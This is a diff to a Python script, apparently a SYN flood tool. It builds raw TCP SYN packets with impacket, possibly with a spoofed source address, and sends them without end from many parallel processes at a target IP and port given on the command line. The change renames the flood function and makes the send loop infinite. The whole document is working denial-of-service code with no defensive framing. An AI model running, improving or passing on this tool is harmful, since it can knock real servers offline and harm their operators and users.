@@ -1,10 +1,13 @@
+from itertools import repeat
+import asyncio
 import socket
 import impacket.ImpactPacket
 import random
 import multiprocessing
 import sys
 
-def send(src_ip,src_port,dst_ip,dst_port):
+def synflood(src_ip,src_port,dst_ip,dst_port):
+    #loop = asyncio.get_running_loop()
     s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
     ip = impacket.ImpactPacket.IP()
     tcp = impacket.ImpactPacket.TCP()
@@ -19,25 +22,11 @@ def send(src_ip,src_port,dst_ip,dst_port):
     tcp.set_th_win(20000)#设置Window Size
     ip.contains(tcp)
     ip.calculate_checksum()
-    #若循环出错，退出二次循环
-    try:
-        while 1:
-            s.sendto(ip.get_packet(),(dst_ip,dst_port))
-    except:
-        pass
-    #for n in range(count):
-    #for n in iter(lambda: s.sendto(ip.get_packet(),(dst_ip,dst_port)),"ws"):
-        #pass
-    #print('send 1 packet')
+    for _ in repeat(None):
+        s.sendto(ip.get_packet(),(dst_ip,dst_port))
 
-def synFlood(src_ip,src_port,dst_ip,dst_port):
-    if src_port == "random":
-        src_port=random.randint(10000,60000)
-    #while 1:
-        #src_port=random.randint(10000,60000)
-        #send(src_ip,src_port,dst_ip,dst_port)
-    for n in iter(lambda: send(src_ip,src_port,dst_ip,dst_port),"ws"):
-        pass
+#def asynflood(src_ip,src_port,dst_ip,dst_port):
+        #asyncio.run(synFlood(src_ip,src_port,dst_ip,dst_port))
 
 def parameter():
     global src_ip,src_port,dst_ip,dst_port,thread_count
@@ -49,11 +38,11 @@ def parameter():
     dst_ip = sys.argv[3]
     dst_port = int(sys.argv[4])
     thread_count = int(sys.argv[5])
-    
+
 if __name__=='__main__':
     parameter()
     pros=[]
     for _ in range(thread_count):
-        pros.append(multiprocessing.Process(target=synFlood,args=(src_ip,src_port,dst_ip,dst_port)))
+        pros.append(multiprocessing.Process(target=synflood,args=(src_ip,src_port,dst_ip,dst_port)))
     for pro in pros:
         pro.start()
